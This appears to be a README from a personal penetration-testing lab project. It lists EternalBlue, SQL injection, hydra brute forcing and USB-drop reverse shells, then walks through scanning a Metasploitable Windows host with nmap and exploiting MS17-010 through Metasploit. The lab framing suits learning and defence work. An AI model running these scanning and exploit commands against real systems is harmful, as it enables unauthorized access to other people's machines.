The objective of this project was to familiarize myself with known vulnerabilities and
with said knowledge, be able to build counter measures/patch necessary apps & OS.

 - Eternal Blue is one of my favorite vulns, it exposed how many devices could be easily infected with little to no effort by sending modified packets 
to the victim machine. Windows had a vulnerability within the OS server message block. This has crippled entire sectors of industrial sites when combined
into wannacry.

 - SQL Injection is a very common attack vector as many corporations/servers use SQL. 

 - Brute force ssh using hydra to show how basic ssh/telnet/ftp/sftp/mysql services can be brute forced when improperly configured or straight out vulnerable.

 - Reverse shells by "dropping USBs" (simulating a physical pentest)

HOW TO REPLICATE 
--------------------------
NOTE: I will be using metasploitable both win/linux to demonstrate most if not all vulns/exploits.

   Step 1: 
   Once your windows server and kali/parrot machine is spun up, ensure the two machines can communicate with each other by either using netdiscover or Nmap.
  ~~~
   sudo netdiscover -r ipaddress/prefix | OR | nmap -T4 -sV --version-all --osscan-guess -A -p 1-10000 ipaddress
  ~~~

  Step 2: 
  Use Nmap to confirm the windows server is vulnerable by using one of the NSE scripts that come with Nmap,

  ~~~
  nmap -p 139, 445 --script smb-vuln-ms17-010 ipaddress
  ~~~

  Step 3: 
 Once verified, within your attacking machine spin up msfconsole and search for the smb-ms17-010 exploit and configure it for your victim machine.

~~~
  msfconsole , use exploit/windows/smb/ms17_010_eternalblue , options , set rhost ipaddress , check , run 
~~~
Congrats you have used an exploit to gain unauthorized access!
